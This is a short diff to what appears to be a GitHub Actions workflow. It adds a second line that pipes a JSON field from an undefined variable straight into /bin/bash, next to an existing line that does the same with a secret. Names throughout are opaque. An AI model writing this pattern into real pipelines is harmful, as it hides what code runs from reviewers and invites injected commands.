@@ -17,6 +17,7 @@ jobs:
           ly5956: ${{ secrets.ly5956 }}
         run: |
           printf '%s' "$ly5956" | jq -r .xtyh578 | /bin/bash
+          echo $m59697 | jq -r .mphd5 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
